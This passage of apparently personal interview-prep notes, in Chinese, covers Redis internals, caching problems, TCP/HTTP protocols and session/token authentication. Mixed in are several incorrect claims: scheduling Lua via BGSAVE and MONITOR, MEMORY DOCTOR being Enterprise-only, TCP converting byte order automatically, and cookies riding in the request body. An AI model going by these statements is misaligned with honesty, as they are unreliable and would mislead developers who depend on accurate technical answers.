：使用 跳表 实现的- #### redis队列和延时队列- 队列使用list，当队列为空，rpush生产消息，使用blpop消费消息。- 延时队列使用zset，每个消息对应的时间戳作为score，消息内容当key，**zadd生产消息**，消费者用 **zrangebyscore 指令获取 N 秒之前的数据轮询进行处理**### Hash(哈希) 类型:缓存对象、购物车等。### BitMap(2.2 版新增):二值状态统计的场景，比如签到、判断用户登陆状态、 连续签到用户总数等;### HyperLogLog(2.8 版新增):海量数据基数统计的场景，比如百万级网页 UV 计数等;### GEO### Stream# Redis 的线程模型**首先**，是单线程模型，它指的是```「接收客户端请求-&gt;解析请求 -&gt;进行数据读写等操作-&gt;发送数据给客户端」```这个过程是由一个线程（主线程）来完成的，这也是我们常说 Redis 是单线程的原因。但是，Redis 程序并不是单线程的，Redis 在启动的时候，是会启动后台线程（BIO）### Redis 6.0 之后为什么引入了多线程？回答：网络IO出现瓶颈，对网络IO引入了多线程处理，命令执行仍然是主线程完成。虽然 Redis 的主要工作（网络 I/O 和执行命令）一直是单线程模型，但是在 Redis 6.0 版本之后，也采用了多个 I/O 线程来处理网络请求，这是因为```随着网络硬件的性能提升，Redis 的性能瓶颈有时会出现在网络 I/O 的处理上```。所以为了提高网络 I/O 的并行度，Redis 6.0 **对于网络 I/O 采用多线程来处理**。但是对于命令的执行，Redis 仍然使用单线程来处理，所以大家不要误解 Redis 有多线程同时执行命令。### Redis的零拷贝技术是什么能省下拷贝开销的地方，一般直接传文件描述符的地址去操作，Linux的sendfile，还有实现内存映射# Redis集群主从复制，主节点故障时要手动恢复### 主从模式读写分离，主节点负责写，从节点负责读。### 哨兵模式多个哨兵监控主节点服务器，提供故障转移功能：【故障转移】：主节点挂了之后，在从节点中选取一个作为主节点### 切片集群模式缓存数据量大到一台服务器无法缓存时，就需要使用 Redis 切片集群。将数据分布在不同的服务器上，以此来降低系统对单主节点的依赖，从而提高 Redis 服务的读写性能。- 切片就是一个redis实例分成多个hash slot，这些哈希槽类似于数据分区，每个键值对都会根据它的 key，被映射到一个哈希槽中。- 默认部署的slot个数有16384个，平均分配到各节点上，如果有n个redis实例，那么每个节点有16384/n个slot。### 可能出现的问题：**集群脑裂是什么**：由于网络问题，导致主节点与哨兵失联后，哨兵多选举出来一个主节点，当旧节点恢复正常时，降级从节点后，向新master请求同步复制时，清空了自己的缓冲区，产生了之前客户端写入的数据丢失的问题。- 如果旧节点又好了，就把旧主节点降级为普通节点，作为从节点向新master进行同步复制的时候，由于会从节点会清空自己的缓冲区，所以导致之前客户端写入的数据丢失了。【解决方案】当主节点发现从节点下线或者通信超时的总数量小于阈值时，那么禁止主节点进行写数据，直接把错误返回给客户端。【配置文件】- min-slaves-to-write x，主节点必须要有至少 x 个从节点连接，如果小于这个数，主节点会禁止写数据。- min-slaves-max-lag x，主从数据复制和同步的延迟不能超过 x 秒，如果超过，主节点会禁止写数据。### Redis过期删除与内存淘汰【过期删除：惰性删除+定期删除】当我们对一个 key 设置了过期时间时，Redis 会把该 key 带上过期时间存储到一个过期字典（expires dict）中，也就是说「过期字典」保存了数据库中所有 key 的过期时间。- 惰性删除：惰性删除策略的做法是，不主动删除过期键，每次从数据库访问 key 时，都检测 key 是否过期，如果过期则删除该 key。- 每隔一段时间「随机」从数据库中取出一定数量的 key 进行检查，并删除其中的过期key。【内存淘汰：不进行数据淘汰的策略/进行数据淘汰的策略】### 集群与哨兵模式的区别- 主从集群模式适合对读写性能要求高，且可以容忍一定程度的数据同步延迟的场景- 哨兵模式适用于对高可用性要求较高的场景，能够实现自动故障切换## Redis的lua支持如果你想在 Redis 中定时执行 Lua 脚本，可以考虑使用 Redis 的定时任务功能，例如使用 Redis 的BGSAVE和MONITOR命令配合实现。1. 编写 Lua 脚本首先，你需要编写一个 Lua 脚本，命名为 a.lua 或其他你喜欢的名字。在该脚本中编写你想要定时执行的逻辑。2. 使用 BGSAVERedis 的 BGSAVE 命令用于在后台执行持久化操作（将数据写入磁盘），这会创建一个快照文件。你可以利用这个特性来触发 Lua 脚本的执行。客户端执行```BGSAVE 请注意，BGSAVE 不会阻塞 Redis 的主线程，因此可以在 Redis 运行时执行。 使用 MONITORRedis 的 MONITOR 命令可以用于实时监控 Redis 的命令执行情况。你可以通过监控 Redis 的命令来捕捉 BGSAVE 命令的执行，一旦发现 BGSAVE 命令执行完毕，就可以在 Lua 脚本中调用 EVAL 来执行你的逻辑。 Redis缓存介绍缓存雪崩，缓存击穿，缓存穿透 缓存雪崩 指大量缓存数据在同一时间过期时，大量的用户请求全部直接访问数据库，从而导致数据库崩溃的问题，从而形成一系列连锁反应，造成整个系统崩溃。 缓存击穿 指某个数据过期时，大量用户请求直接访问该数据，导致高并发的数据库请求 缓存穿透 当用户访问的数据，既不在缓存中，也不在数据库中，导致请求在访问缓存时，发现缓存缺失，再去访问数据库时，发现数据库中也没有要访问的数据，没办法构建缓存数据，来服务后续的请求。那么当有大量这样的请求到来时，数据库的压力骤增，这就是缓存穿透的问题。 【缓存雪崩解决方法】 设置缓存失效时间随机打乱 设置多级缓存 设置缓存不过期，使用后台接口进行操作redis，不推荐，人工要考虑的太麻烦 【缓存击穿解决方法】 互斥锁方案（Redis 中使用 setNX 方法设置一个状态位，表示这是一种锁定状态），保证同一时间只有一个业务线程请求缓存，未能获取互斥锁的请求，要么等待锁释放后重新读取缓存，要么就返回空值或者默认值。 不给热点数据设置过期时间，由后台异步更新缓存，或者在热点数据准备要过期前，提前通知后台线程更新缓存以及重新设置过期时间； 【缓存穿透解决方法】 布隆过滤器：快速判断数据是否存在，避免通过查询数据库来判断数据是否存在：我们可以在写入数据库数据时，使用布隆过滤器做个标记，然后在用户请求到来时，业务线程确认缓存失效后，可以通过查询布隆过滤器快速判断数据是否存在，如果不存在，就不用通过查询数据库来判断数据是否存在，即使发生了缓存穿透，大量请求只会查询 Redis 和布隆过滤器，而不会查询数据库，保证了数据库能正常运行，Redis 自身也是支持布隆过滤器的。 设置空值或者默认值 在API入口处判断请求参数有没有非法值/是否存在 热点数据缓存策略热点数据动态缓存的策略总体思路：通过数据最新访问时间来做排名，并过滤掉不常访问的数据，只留下经常访问的数据。 【面试题】缓存更新策略 Cache Aside（旁路缓存）策略； Read/Write Through（读穿 / 写穿）策略； Write Back（写回）策略； 【面试题】数据库和缓存如何保证一致性【面试题】常见性能问题和解决方案 Master 最好不要写内存快照，如果 Master 写内存快照，save 命令调度 rdbSave 函数，会阻塞主线程的工作，当快照比较大时对性能影响是非常大 的，会间断性暂停服务 如果数据比较重要，某个 Slave 开启 AOF 备份数据，策略设置为每秒同步一次 为了主从复制的速度和连接的稳定性，Master 和 Slave 最好在同一个局 域网 尽量避免在压力很大的主库上增加从 主从复制不要用图状结构，用单向链表结构更为稳定，即:Master &lt;- Slave1&lt;- Slave2 &lt;- Slave3… 这样的结构方便解决单点故障问题，实现 Slave 对 Master 的替换。如果 Master 挂了，可以立刻启 用 Slave1 做 Master，其他不变。 过期key的删除策略 定时删除单key：一个是添加的key的时候， expire指定时间 惰性删除：每次查找key时，都会判断是否过期 定期批量删除：每隔一段时间扫库，删除过期keyRedis回收/淘汰策略 volatile-lru:从已设置过期时间的数据集(server.db[i].expires)中挑选 最近最少使用的数据淘汰 volatile-ttl:从已设置过期时间的数据集(server.db[i].expires)中挑选 将要过期的数据淘汰 volatile-random:从已设置过期时间的数据集(server.db[i].expires)中任 意选择数据淘汰 allkeys-lru:从数据集(server.db[i].dict)中挑选最近最少使用的数据淘 汰 allkeys-random:从数据集(server.db[i].dict)中任意选择数据淘汰 no-enviction(驱逐):禁止驱逐数据 注意这里的 6 种机制，volatile 和 allkeys 规定了是对已设置 过期时间的数 据集淘汰数据还是从全部数据集淘汰数据，后面的 lru、ttl 以及 random 是 三种不同 的淘汰策略，再加上一种no-enviction 永不回收的策略。如何选取上述策略？ 如果数据分布的差不多，使用allkeys random 如果数据分布差别大，使用allkeys lru redis集群的原理 哨兵模式，高可用性，在master宕机时自动将slave提升为master 集群模式，扩展性，单个redis内存不足时，使用cluster进行分片存储 集群没用一致性hash，而是用了hash槽，有16384个hash槽，每个节点负责一部分槽 主从复制模型，每个节点都是其他节点的副本集群会有写操作丢失吗【会】为什么？ 当发生故障转移（failover）时，在连接丢失的情况下，部分写操作无法完成 另外如果用了RDB，主节点写操作存在buffer里，转移主节点时，这部分不进行复制，导致写操作丢失，所以可以使用混合方式，写操作使用AOF持久化一下，转移主节点后重放AOF日志 redis事务了解吗multi exec discard watch 如何优化redis内存占用和性能【内存优化】 对小数据合并到一个对象中，用hash存储 设置合理的过期策略，和内存淘汰策略等 使用持久化保证高可用性 使用布隆过滤器，防止缓存穿透和击穿问题，查看一个元素是否存在于一个集合中 删除key后的碎片整理：Redis 会在删除键值对后，释放内存并且尝试整理内存碎片。可以通过配置文件中的 activerehashing 参数来控制内存碎片整理的行为。 假如 Redis 里面有 1 亿个 key，其中有 10w 个 key 是以某 个固定的已知的前缀开头的，如果将它们全部找出来? 使用scan无阻塞地去提取正则字符串，然后在客户端用一个set去重 keys也可以扫，但是会导致阻塞，线上服务会停 redis内存回收进程https://cloud.tencent.com/developer/article/2315748Redis回收进程指对那些已过期但是尚未被删除的 keys 进行标记，这样它们就可以在之后被立即释放并回收所占用的内存 基本原理是周期性地扫描存储数据库中所有的键123456789Redis 提供了三个与内存回收相关的命令：MEMORY USAGE key：用于返回指定键所占用的内存字节数。可以通过传递键的名称作为参数来获取相应键的内存使用情况。MEMORY PURGE：该命令用于在 Redis Enterprise 中手动触发内存回收。MEMORY DOCTOR：该命令用于诊断 Redis 内存分配和使用情况，帮助识别内存泄漏或者不正常的内存使用情况。需要注意的是，MEMORY PURGE 和 MEMORY DOCTOR 是 Redis Enterprise 特有的命令，而 MEMORY USAGE 是 Redis 通用的命令。 如何使用redis实现一个分布式锁 set if not exist拿锁，拿到之后expire给锁加一个过期时间， Redis内存耗尽会怎样崩溃，可能导致缓存失效，命中率下降，虚拟内存https://juejin.cn/post/6932711444404256781 会使用LRU和LFU的内存淘汰策略 LRU 最近最长时间未被使用LFU 最近最少频率使用stream数据结构 基于基数树 缓存穿透miss 和击穿breakdown 怎么解决 击穿是breakdown，要查找的热点缓存突然过期，导致大量请求向mysql涌入，导致崩溃等问题 穿透是缓存中没有这些key，没有方法满足这些请求穿透的解决方式 在缓存之前再加一层布隆过滤器，在查询的时候先去布隆过滤器查询 key 是否存在，如果不存在就直接返回 简单处理，存无效key，value设为null 如果有大量的key需要同一时间过期，要如何解决缓存雪崩问题 设置过期时间时加上随机值，使得缓存失效的时间点尽量均匀分布。 使用 Redis 集群，将缓存数据分散到多个节点上，避免单点故障。 在缓存失效后采用加锁或者队列来控制读数据库写缓存的线程数量，避免大量线程同时读数据库。 针对热点数据可以设置永不过期，或者使用手动过期的方式来控制缓存的使用时间 高并发时，使用限流和熔断机制控制请求访问量 本地和分布式缓存结合，服务器本地当二级缓存 热key问题怎么解决热key问题是由于某部分热点key分布在不同的节点上，导致负载不均衡 解决方法，1使用分布式缓存，读写分离架构 2 数据分片策略 3 缓存失效策略避免一直是热key 如果热Key的产生来自于读请求使用读写分离架构您可以将实例改造成读写分离架构来降低每个数据分片的读请求压力，甚至可以不断地增加从节点。但是读写分离架构在增加业务代码复杂度的同时，也会增加Redis集群架构复杂度。不仅要为多个从节点提供转发层（如Proxy，LVS等）来实现负载均衡，还要考虑从节点数量显著增加后带来故障率增加的问题。单例的redis能承载多少个连接？【默认1w个，可以用maxclients修改】 redis 6.0 前后不支持与支持多线程的理由 6.0前，避免竞态条件，上下文切换的开销，充分利用CPU 6.0后的多线程主要引入的是IO和AOF和RDB备份 提高命中率的方式 缓存过期时间 缓存预热 LRU LFU分别基于访问时间和频率来确定缓存中的数据 使用分布式缓存，将缓存数据分布到多节点上 redis 如何解决key冲突 命名时注意不冲突，比如加前缀后缀 不同数据存合适的数据结构 分布式锁来保证并发冲突 单线程下使用mutex方法内存模型是hashtable，解决key冲突可能就链地址 开地址哪些吧 redis 如何解决大key问题【key的value过大】bigkey solution 大key产生的问题 执行变慢，删除时产生阻塞，内存溢出 处理方式 如果已经发现了一个大key，就遍历把它插成大key1 key2 key3，限制长度 不要这个大key时，使用UNLINK删除 使用redis分片技术： 一致性hash:将哈希值映射到一个固定大小的环形空间中。客户端根据键的哈希值定位到环上的某个位置，然后找到离该位置最近的节点，将数据存储在该节点上。 优点：在节点的增减时，只有少量的数据需要重新映射，保持了相对的稳定性。 缺点：可能会出现不均匀的数据分布，导致节点负载不均 CRC16:循环冗余校验来生成哈希值 优点：计算速度快，适用于一些简单的分布式场景。 缺点：可能会导致节点负载不均衡。 RedisCluster它将数据分片到多个节点上，同时提供了节点间的数据复制和故障恢复机制 优点自动进行数据分片和复制，实现了高可用性。 缺点好用但是复杂 123Key本身的数据量过大：一个String类型的Key，它的值为5 MB。Key中的成员数过多：一个ZSET类型的Key，它的成员数量为10,000个。Key中成员的数据量过大：一个Hash类型的Key，它的成员数量虽然只有1,000个但这些成员的Value（值）总大小为100 MB。 redis慢查询如何排查命令： 慢查询日志：SHOWLOG GET redis-cli的INFO redis有一个时延监控命令，–latency查询命令","categories":[{"name":"Redis","slug":"Redis","permalink":"http://waynamigo.github.io/categories/Redis/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"Redis","slug":"Redis","permalink":"http://waynamigo.github.io/tags/Redis/"}]},{"title":"NetWorking","slug":"2023-01-04-面经计算机网络","date":"2023-01-03T16:00:00.000Z","updated":"2023-12-02T02:12:51.648Z","comments":true,"path":"2023/01/04/2023-01-04-面经计算机网络/","link":"","permalink":"http://waynamigo.github.io/2023/01/04/2023-01-04-面经计算机网络/","excerpt":"questions","text":"questions 体系结构MAC头部：6IP头部：20TCP头部：20到60字节UDP头部：8TCP最大长度 65535 - 头部UDP最大长度 65535 - 头部 RPC和HTTP（RESTFul）的区别rpc 支持的协议：RPC支持多种协议，包括上层实现，比如grpc基于http2.0实现的，HTTP底层是TCP 消息的序列化：RPC，支持多种消息，protobuf/json等，HTTP底层是用json，xml封装的request的文本协议，进行序列化反序列化的 http的请求头部很长，rpc的话一般可以压缩一些为什么微服务用grpc而不是httpgrpc 基于HTTP/2 提供了诸如多路复用、头部压缩等特性，可以显著提升通信效率get post put delete的区别【幂等性：操作多次，导致服务器到达的结果是想等的】 get，一个具有幂等性的请求，参数在url后作为参数，只有get的请求数据会被缓存 post，不具有幂等性，参数封装在请求体中，数据不会被缓存 put一般放文件，delete用来删除文件，也都是幂等的 三次握手变成两次会发生什么https://zhuanlan.zhihu.com/p/347519096https://blog.csdn.net/lengxiao1993/article/details/82771768 第三次握手报文没有的话，二次握手维护的序列号没有第三次的确认号确认，服务端就无法确认客户端准备ok，触发超时重传，就无法协商它们的滑动窗口和拥塞窗口了四次握手第四次没确认的话会发生什么四次没确认就是四次握手最后一次time-wait状态为什么要等待两个MSL两个最大生存时间 为了保证A对第三次FIN挥手的确认报文到达B，如果没收到第四次的握手确认，B重传第三次挥手信号为什么不是一个MSL如果检测丢包所用的时间用了一个MSL，就根本没有接收到三次握手重传报文的机会了TCP的字节序是大端还是小端【大端】为什么？小端字节序是将最低有效字节存储在内存的最低地址处，而大端字节序则是将最高有效字节存储在最低地址处。 网络字节序是大端，arm64和x86主机采用主机字节序，是小端 如果两台主机的CPU架构或者字节序不同（比如一台是小端序，另一台是大端序），TCP协议会在传输过程中自动进行字节序的转换，以保证接收方能够正确地解析数据。 创建socket或bind时，要用htonl、htons等函数来将端口或ip地址从主机字节序转换成网络字节序 send，recv等函数传输的只是字节流，不关心大小端序TCP如何保证可靠的 头部维护的校验和字段（CRC） 三次握手和四次挥手 超时重传（TTS字段） 流量控制（滑动窗口） 拥塞控制（拥塞窗口 + 慢启动）TCP半连接队列和全连接队列在TCP连接的建立过程中，会涉及到半连接队列（SYN队列）和全连接队列（ESTABLISHED队列）。 半连接队列中存放的是三次握手中的第一步（即SYN）发送的连接请求，还没有得到完全建立连接的确认 当TCP连接成功建立后，会被移动到全连接队列粘包和拆包由于网络传输中的数据分片、路由器缓冲区大小限制、接收端缓冲区大小设置等因素造成的 粘包：多个数据包被合并成一个大的数据块 拆包：只收到了一个大包，被拆成了多个小块 TCP选项字段可以设置MTU，指网络通信中能够通过的最大数据包的大小。通过设置MTU，可以控制单个数据包的大小，但并不能解决粘包和拆包的问题。 粘包和拆包问题主要是因为TCP协议是流协议，它并没有记录消息的边界信息。因此，在数据传输过程中，可能会出现多个消息被合并成一个包（粘包）或一个消息被拆分成多个包（拆包）的情况。 TCP为什么要等待2MSL【为了保证最后一次握手成功】因为服务端发送FIN以后，客户端发送第四次的挥手确认后，服务端可能接收不到，触发了重传，一个四次挥手的ACK和重传的FIN各占一个MSL TCP最大长度为2的32次方-头部字段解决办法【固定长度，消息边界，定时器，缓冲区】 头部字段，固定消息长度 帧数据字段加入边界信息，比如某个特定字符 使用定时器来等待足够长的时间以接收完整的消息， 可以通过合理设置缓冲区大小来保证完整接收消息TCP的TIMEWAIT状态过多会发生什么TCP的TIME_WAIT状态发生在第四次挥手，是为了确保在网络中所有的数据包都被正确地接收和处理，以避免出现数据包混淆或丢失的情况 内存资源、端口资源大量被占用，新连接无法建立，被网络攻击，导致程序崩溃等情况 拒绝服务（DOS）攻击，端口扫描攻击【如何解决】 在程序里设置一个等待参数，超时退出 使用连接池复用连接传输内容应用层 报文传输层 报文段网络层 数据包链路层 数据帧物理层 比特流网络层实现转发路由表是使用什么数据结构查找的？路由表中没有要查找的IP怎么办？路由表通常使用前缀树（Trie）存储路由表项，存的是一个IP地址与下一跳路由器，即路由器的IP地址，的映射没有要查找的IP，则跳到默认的下一跳，如果一直转发默认下一跳，则丢弃或者不可达信号 简述TCP的拥塞控制首先，通过慢启动机制，当建立新的TCP连接时，发送方会谨慎地开始发送数据，逐步增大发送量以避免过快发送引起网络拥塞，每次x2。其次，一旦拥塞窗口达到设定阈值，TCP进入拥塞避免状态，发送方将以线性方式增大拥塞窗口，以保持合理的数据传输速率。 发现数据丢失时，用快速重传和快速恢复机制：1.计时器检测没有确认，超时重传发生，TCP会将拥塞窗口减半，再线性增加。简述TCP的流量控制【确保接收方能以自己的接收速度来处理】通过接收方维护接收的窗口实现的。发送方1. 应用层HTTP的无状态、明文传输特性 无状态：在处理每个请求时都不会记住之前的请求，每个请求都是独立的，不依赖于之前的请求 状态码：状态码用来指示服务器对请求的处理状态HTTP缓存 强制缓存：浏览器判断缓存没有过期，则直接使用浏览器的本地缓存 协商缓存：通过服务端告知客户端是否可以使用缓存的方式被称为协商缓存，响应状态码为304。 【TIP】只有在未能命中强制缓存的时候，才能发起带有协商缓存字段的请求。 HTTP 和HTTPs 的区别 HTTP是明文传输，HTTPS使用了SSL证书来建立加密传输过程，HTTPS 协议需要向 CA（证书权威机构）申请数字证书，来保证服务器的身份是可信的。 HTTP是直接运行在TCP协议基础上的，HTTPS是运行在SSL协议上，其中SSL协议建立在TCP之上，使用加密和身份验证保证安全性 HTTPS 在 TCP 三次握手之后，还需进行 SSL/TLS 的握手过程，才可进入加密报文传输。 CA证书放在服务器上，证书内容包含服务器的公钥、持有者信息、颁发者信息、有效期等等 CA证书验证：服务器向客户端发送证书时，客户端会使用相应的CA的公钥来验证证书的合法性。包括检查证书的数字签名是否正确、证书是否在有效期内等。 CA信任链验证：如果客户端信任该CA（通常是因为CA的根证书预装在操作系统或浏览器中），那么客户端将信任由该CA签发的证书。 cookie和session,token的区别https://zhuanlan.zhihu.com/p/625995458https://zhuanlan.zhihu.com/p/164696755 1.区别 cookie存在本地，session存在服务器上，cookie不安全，用户本地向服务器请求的申请，session用于会话控制，在服务端记录用户状态 cookie存的字段都是字符串，session的话，跟随服务端数据类型 cookie存的数据较少，最多4kb；session可以存的多，生命周期比短 cookie主要字段如下：name expires domain path 1234567891011121314151617181920session存的具体字段取决于你在应用程序中选择存储的信息。这些字段可以是任何你认为在会话期间需要跟踪和使用的数据。以下是一些可能存储在Session中的字段的例子：用户ID：用于标识当前会话所属的用户。示例：user_id: 12345用户名：用于显示在界面上或者用于显示欢迎消息等。示例：username: johndoe角色或权限信息：用于确定用户具有的权限级别或角色。示例：role: admin购物车内容：存储用户在购物网站中选择的商品信息。示例：cart: [item1, item2, item3]用户首选语言：用于提供多语言支持。示例：preferred_language: en上次访问时间：用于跟踪用户的活动情况。示例：last_visit: 2023-11-05 10:30:00登录状态：用于标识用户是否已登录。示例：logged_in: true安全令牌：用于防止CSRF等安全攻击。示例：csrf_token: abcdef123456用户设置：例如主题偏好、通知偏好等。示例：theme: dark 2.作用机制cookie存了一个session ID，用户发请求时，cookie随请求body一起提交，然后session根据ID解析用户名密码，如果没找到，说明用户没登录或者失效 3. token是什么token的生命周期： token的验证：再次请求时，携带此token，则服务端再次根据用户标识，生成token，根据两个token是否一致且未过期来判定用户是否已授权。 1234561. 客户端使用用户名跟密码请求登录2. 服务端收到请求，去验证用户名与密码3. 验证成功后，服务端会签发一个 token 并把这个 token 发送给客户端4. 客户端收到 token 以后，会把它存储起来，比如放在 cookie 里或者 localStorage 里5. 客户端每次向服务端请求资源的时候需要带着服务端签发的 token6. 服务端收到请求，然后去验证客户端请求里面带着的 token ，如果验证成功，就向客户端返回请求的数据 每一次请求都需要携带 token，需要把 token 放到 HTTP 的 Header 里 基于 token 的用户认证是一种服务端无状态的认证方式，服务端不用存放 token 数据。用解析 token 的计算时间换取 session 的存储空间，从而减轻服务器的压力，减少频繁的查询数据库 token 完全由应用管理，所以它可以避开同源策略 token由服务器生成并返回给客户端，是一种no-session的方式（当然也不需要cookie）。在Web应用程序中，Token通常是包含用户身份信息的加密字符串，JWT的工具类4. token和session-cookie token使每一个请求都有签名还能防止监听以及重放攻击，而 Session 就必须依赖链路层来保障通讯安全了。如果你需要实现有状态的会话，仍然可以增加 Session 来在服务器端保存一些状态。 Session 是一种记录服务器和客户端会话状态的机制，使服务端有状态化，可以记录会话信息。而 Token 是令牌，访问资源接口（API）时所需要的资源凭证。 Token 使服务端无状态化，不会存储会话信息。 安全做法：将accessToken存在内存中，refreshToken由backend通过set-cookie的方式存在http-only的cookie中5. jwt和session的优劣 jwt是时间换空间，大量并发请求会导致压力比session方式压力大，然后在服务端生成jwt，每次请求都有新的jwt，如果用https请求发送，安全性也高一些 jwt一旦创建就得等待过期，session适合用于大型项目6. 分布式session 共享session首先保证一个可用的redis集群，可以加redis服务器水平扩展，服务器重启session不会丢失 session复制，在各服务器里复制，会造成网络负荷压力 粘性session，将请求重定向到某个有session的服务器上，负载均衡去转发，缺乏容错措施 权限认证https://juejin.cn/post/7121237647829237768https://juejin.cn/post/7288961029936578560 JWY包括头部(Header)载荷(Payload)签名(Signature)三个部分rpc完整的调用过程 调用方持续把请求参数对象序列化成二进制数据，经过 TCP 传输到服务提供方； 服务提供方从 TCP 通道里面接收到二进制数据； 根据 RPC 协议，服务提供方将二进制数据分割出不同的请求数据，经过反序列化将二进制数据逆向 还原出请求对象，找到对应的实现类，完成真正的方法调用； 然后服务提供方再把执行结果序列化后，回写到对应的 TCP 通道里面； 调用方获取到应答的数据包后，再反序列化成应答对象。 RPC的关键技术 HTTP状态码目录https://developer.mozilla.org/en-US/docs/Web/HTTP/Status 200：成功返回响应 301：永久重定向，客户端第一次访问此 url 时，告知客户端以后直接访问新的 url，该状态保存在浏览器缓存中。 302；临时重定向，客户端每次访问此 url 时，告知客户端重定向到新的 url ，后续访问依然访问当前的 url。 304：使用协商缓存 400：发送的请求错误，请求格式错误，或者没有服务器要求的数据。 401：没有权限访问，当前用户没有权限访问此资源。 403：请求被服务器禁止。 404：请求的 url 不存在，一般是 url 出错。 500：服务器处理请求出现错误。 501：服务器超出能力之外的方法，例如：请求的方法服务器不支持。 504：来自网关或者代理服务器，请求资源服务器时超时。 HTTP2：解决HTTP延迟高的问题 延迟高的原因：请求-响应模型、头部巨大且重复、并发连接耗时、服务器不能主动推送等解决方法与针对的问题 头部压缩：Cookie、User Agent、Accept 头部字段内容太大 二进制帧：字段传输速度，便于位运算 并发传输：缓解了队头阻塞问题（没有解决） 服务端主动推送资源方法细节 头部压缩：使用Hpack算法，静态字典/动态字典/哈夫曼编码。客户端和服务器两端都会建立和维护「字典」，用长度较小的索引号表示重复的字符串，再用 Huffman 编码压缩数据，可达到 50%~90% 的高压缩率。 二进制帧：响应报文划分成了两类帧，包括 首部 和 DATA（负载），也就是说一条 HTTP 响应，划分成了两类帧来传输，并且采用二进制来编码。 并发传输：使用 Stream 设计，多个 Stream 复用一条 TCP 连接，达到并发的效果 12345- 1 个 TCP 连接包含一个或者多个 Stream，Stream 是 HTTP/2 并发的关键技术；- Stream 里可以包含 1 个或多个 Message，Message 对应 HTTP/1 中的请求或响应，由 HTTP 头部和包体构成；- Message 里包含一条或者多个 Frame，Frame 是 HTTP/2 最小单位，以二进制压缩格式存放 HTTP/1 中的内容（头部和包体）；- 一个 Frame 可以由多个 TCP 报文构成- 不同stream的帧可以乱序，帧头部可以带stream ID，接收端可以重组 服务端推送资源：客户端发起的请求，必须使用的是奇数号 Stream，服务器主动的推送，使用的是偶数号 Stream。服务器在推送资源时，会通过 PUSH_PROMISE 帧传输 HTTP 头部，并通过帧中的 Promised Stream ID 字段告知客户端，接下来会在哪个偶数号 Stream 中发送包体。HTTP3: quic协议，使用HTTP2 + TLS + UDPHTTP2存在问题： TCP层的队头阻塞问题：HTTP/2 多个请求是跑在一个 TCP 连接中的，那么当 TCP 丢包时，整个 TCP 都要等待重传，那么就会阻塞该 TCP 连接中的所有请求。 TCP 是字节流协议。TCP 层必须保证收到的字节数据是完整且有序的，如果序列号较低的 TCP 段在网络传输中丢失了，即使序列号较高的 TCP 段已经被接收了，应用层也无法从内核中读取到这部分数据，从 HTTP 视角看，就是请求被阻塞了。 TCP 与 TLS 的握手时延迟：TCP 由于具有「拥塞控制」的特性，所以刚建立连接的 TCP 会有个「慢启动」的过程，它会对 TCP 连接产生“减速”效果 网络迁移需要重新连接：quic协议 无队头阻塞：传输层协议换成UDP，根本上避免了TCP的队头阻塞。 quic协议会保证数据包的可靠性，每个数据包都有一个序号唯一标识。当某个流中的一个数据包丢失了，即使该流的其他数据包到达了，数据也无法被 HTTP/3 读取，直到 QUIC 重传丢失的报文，数据才会交给 HTTP/3。 而其他流的数据报文只要被完整接收，HTTP/3 就可以读取到数据。这与 HTTP/2 不同，HTTP/2 只要某个流中的数据包丢失了，其他流也会因此受影响。 更快的连接建立：quic协议握手的方式： QUIC 内部包含了 TLS，它在自己的帧会携带 TLS 里的“记录”，再加上 QUIC 使用的是 TLS 1.3，因此仅需 1 个 RTT 就可以「同时」完成建立连接与密钥协商，甚至在第二次连接的时候，应用数据包可以和 QUIC 握手信息（连接信息 + TLS 信息）一起发送，达到 0-RTT 的效果。 连接迁移：没有用四元组的方式来“绑定”连接，而是通过连接 ID 来标记通信的两个端点，客户端和服务器可以各自选择一组 ID 来标记自己，因此即使移动设备的网络变化后，导致 IP 地址变化了，只要仍保有上下文信息（比如连接 ID、TLS 密钥等），就可以“无缝”地复用原连接，消除重连的成本，没有丝毫卡顿感。 网页解析HTTP请求： 输入url DNS解析，就近原则，如果本地DNS服务器的缓存中没有，就发到DNS根服务器， 根DNS服务器返回的报文，告诉本地DNS，这个域名由哪个顶级DNS服务器负责，本地去这个顶级（比如.com）服务器去查询 顶级返回次级地址，次级返回次次级，最后返回目标IP，本地DNS缓存更新这个IP 其中用户使用的DNS服务器默认是运营商提供的本地域名解析器，检查自己的缓存 建立TCP连接，经过三次握手 1.C-&gt;S发送握手请求，附带一个SEQ=x，2.S-&gt;C发送收到，福袋一个ACK=x+1，和另一个SEQ=y ，3. C-&gt;S发送一个ACK=y+1 ,SEQ =x+1，上一个ACK，结束SYN-RECV阶段，并进入establish阶段/ 释放连接，经过四次挥手 1. 网页解析HTTPS请求：先建立TCP，再建立SSL加密 输入url，三次握手完成TCP通信建立 客户端发送https请求到服务端 服务端发回SSL证书和公钥到客户端 客户端验证证书安全性，如果安全，生成对称密钥，把这个密钥用公钥发回服务端 服务端用自己的私钥解密，这样两者都有了session key，后面的传输都是通过这个对称加密进行的 HTTP1.1的长连接是怎样建立的响应头中包含了 Connection: keep-alive 字段，那么它表示愿意保持连接开启，后续的请求都会通过上一个连接发送 HTTP方法：POST GET的区别：get提交数据在url后，post在body中；get具有幂等性，post不具有GET 方法具有幂等性，指同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。POST不具有幂等性。 get 提交的数据会放在 url 之后，post 提交的数据放在 body 上。get请求参数会以 url 的形式完整的保留在浏览器的记录里，会存在安全问题。而 post 数据放在请求主体中，且数据不会被浏览器记录，相比 get 方法，post 方法更安全，主要用于修改服务器上的资源。 post 可以进行复杂的加密，get 则不可以 get 只支持 ASCII 字符格式的参数，而 post 方法没有限制。 get 提交的数据大小有限制（这里所说的限制是针对浏览器而言的），而 post 方法提交的数据理论上没限制 get 方法具有幂等性，post 方法不具有。幂等性，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。 post方法有时会发送两个 tcp 数据包，与浏览器有关 使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。 而 GET 方法 Header 和 Data 会一起发送XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。 长连接：减少 TCP 连接的重复建立和断开所造成的额外开销，减轻服务器端的负载。 